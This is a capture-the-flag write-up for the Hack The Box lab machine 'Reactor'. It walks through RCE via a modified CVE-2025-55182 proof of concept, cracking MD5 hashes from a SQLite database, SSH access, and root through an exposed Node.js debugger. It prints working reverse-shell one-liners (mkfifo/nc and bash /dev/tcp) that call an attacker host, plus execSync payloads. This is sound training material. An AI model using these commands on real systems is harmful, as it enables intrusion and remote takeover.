# Reactor - Hack The Box Writeup

## Introduction
**Reactor** is a easy-difficult Linux machine on Hack The Box. Initial access is obtained by exploiting a Remote Code Execution (RCE) vulnerability (CVE-2025-55182) in the *ReactorWatch Core Monitoring System v3.2.1* running on port 3000. Lateral movement involves extracting MD5 password hashes from a local SQLite database (`reactor.db`) and cracking them to obtain SSH credentials for the user `engineer`. Privilege escalation is achieved by exploiting a Node.js debugger process listening locally on port 9229 that runs with root privileges.

### Attack Summary Table
| Metric / Phase | Details |
| --- | --- |
| **Target IP** | `10.129.1.50` (Initial Scan) / `10.129.1.198` (SSH) |
| **OS** | Linux |
| **Initial Access** | Remote Code Execution (RCE) - CVE-2025-55182 (ReactorWatch v3.2.1) |
| **Lateral Movement** | SQLite Database Inspection (`reactor.db`) & MD5 Hash Cracking (`hashcat`) |
| **Privilege Escalation** | Node.js Debugger Exploitation (Port 9229 running as root) |

---

## Reconnaissance

### Port Scanning
An initial network scan was performed to identify open TCP ports and active services:

```bash
nmap -Pn -sC -sV  10.129.1.50 -oN fast_scan
```

```text
PORT STATE SERVICE
22/tcp open ssh
3000/tcp open ppp
```

---

## Initial Access

### Web Enumeration & Remote Code Execution (RCE)
Accessing port 3000 via a web browser revealed the following application header:
```text
REACTORWATCH
CORE MONITORING SYSTEM v3.2.1
```

Researching public exploits for this version led to CVE-2025-55182, an RCE exploit script:
* **Exploit Reference:** `https://github.com/msanft/CVE-2025-55182/blob/main/poc.py`

The exploit script was modified to target the web server and execute a reverse shell command:

```python
BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"
EXECUTABLE = sys.argv[2] if len(sys.argv) > 2 else "id"
```

A reverse shell payload was injected:

```bash
# changed "id" by this:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.15.105 4444 >/tmp/f

# And listen on my machine with:
nc -nlvp 4444
```

---

## Lateral Movement

### Database Inspection
Once inside the system, local enumeration revealed an SQLite database at `/opt/reactor-app/reactor.db`:

```bash
# Finding reactor.db
ls -la /opt/reactor-app

# Interacting with db
sqlite3 /opt/reactor-app/reactor.db

.tables
SELECT * FROM users;
```

```text
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
```

### Hash Cracking
The MD5 hash for the `engineer` user (`39d97110eafe2a9a68639812cd271e8e`) was cracked using Hashcat:

```bash
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

```text
# The output
reactor1
```

### SSH Access
The cracked password (`reactor1`) allowed SSH authentication as the user `engineer`:

```bash
ssh engineer@10.129.1.198
```

---

## Privilege Escalation

### Local Port Enumeration
Enumerating active local connections showed a service listening on localhost port 9229:

```bash
# Finding localhost strange port listening
ss -tulnp
```

```text
tcp  LISTEN  0  511  127.0.0.1:9229  0.0.0.0:*
```

Port 9229 is the default port for the Node.js debugger, which allows command execution.

### Process Inspection
Checking the processes running node revealed that the Node.js process with the inspector/debugger enabled is running as `root`:

```bash
# Investigating owner of the process running the debugger
engineer@reactor:~$ ps aux | grep node
```

```text
node        1414  0.0  2.6 11812532 103412 ?     Ssl  12:48   0:02 next-server (v15.0.3)
root        1416  0.0  1.2 1067180 49764 ?       Ssl  12:48   0:00 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

### Exploiting Node.js Debugger
By connecting to the local debugger port, we can execute arbitrary commands as the `root` user:

```bash
node inspect 127.0.0.1:9229
```

Once connected, commands can be run via the `exec` function to read the flag or execute a reverse shell:

```javascript
# Run a command
exec("process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()")

# Executing a reverse shell
exec("process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.14.130/9002 0>&1\"').toString()")
```
